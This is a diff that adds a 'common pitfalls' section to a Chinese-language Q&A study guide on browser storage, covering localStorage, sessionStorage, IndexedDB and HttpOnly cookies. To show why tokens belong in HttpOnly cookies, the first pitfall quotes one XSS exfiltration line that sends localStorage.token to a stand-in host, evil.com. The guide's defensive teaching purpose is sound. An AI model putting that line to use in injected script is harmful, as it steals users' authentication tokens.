@@ -415,6 +415,30 @@ A: 安全首选 **HttpOnly Cookie**（JS 无法读取，防 XSS 窃取）。Loca
 **Q: LocalStorage 的同步 API 为什么是性能问题？**
 A: LocalStorage 读写是同步的，在主线程执行，可能阻塞渲染。大数据量的读写（如序列化 1000 条记录）会导致页面卡顿。解决方案：小数据无所谓，大数据用 IndexedDB（异步）；或用 Web Worker 做 LocalStorage 操作（但 Worker 无法访问 LocalStorage，需用 IndexedDB）。
 
+## 常见踩坑
+
+**踩坑1：敏感数据存在 localStorage 导致 XSS 泄露**
+❌ 错误：将 JWT token 或用户敏感信息存在 `localStorage`，XSS 注入的 `<script>` 一行代码即可窃取：`fetch('evil.com?t=' + localStorage.token)`。
+✓ 正确：认证 Token 存 `HttpOnly; Secure` Cookie（JS 无法读取），非敏感的 UI 偏好才存 localStorage。
+原因：localStorage 对页面上所有 JS 可见，包括 XSS 注入的恶意脚本，HttpOnly Cookie 是唯一对 JS 不可见的存储。
+
+**踩坑2：大量数据存 localStorage 导致同步阻塞**
+❌ 错误：将 JSON.stringify 后超过 100KB 的数据写入 localStorage，发生在用户操作过程中，UI 卡顿（localStorage 读写是同步阻塞）。
+✓ 正确：数据超过 50KB 或需要复杂查询时改用 IndexedDB（异步 API，不阻塞主线程）。
+原因：localStorage 的所有操作是同步的，大数据读写会阻塞 JS 执行线程，INP 劣化。
+
+**踩坑3：Session Storage 跨 Tab 共享假设**
+❌ 错误：以为同一域名下所有 Tab 共享 Session Storage，实际上每个 Tab 有独立的 Session Storage，一个 Tab 写入另一个 Tab 读不到。
+✓ 正确：需要跨 Tab 共享的状态用 localStorage + `storage` 事件，或 BroadcastChannel，而非 Session Storage。
+原因：Session Storage 的设计语义是"单个会话（Tab）的临时存储"，生命周期绑定 Tab，不跨 Tab 共享。
+
+**踩坑4：IndexedDB 事务未正确关闭导致数据库锁死**
+❌ 错误：`transaction.objectStore(store).get(key)` 后忘记等待 transaction 完成，就开始下一个 transaction，导致数据库锁或并发写入冲突。
+✓ 正确：使用 idb 库（Promise 封装 IndexedDB），事务在所有操作完成后自动提交；或明确监听 `transaction.oncomplete` 后再进行下一个操作。
+原因：IndexedDB 原生 API 的事务管理容易出错，idb/Dexie 等封装库提供更安全的 Promise API。
+
+---
+
 **Q: 浏览器什么时候会清除 IndexedDB 数据？**
 A: 三种情况：①存储空间不足时（Eviction），按 LRU 清除（除非申请了 Persistent Storage）；②用户手动清除浏览器数据；③隐私模式（Incognito）关闭时。`navigator.storage.persist()` 申请持久化保护后，只有用户主动清除才会删除。
 
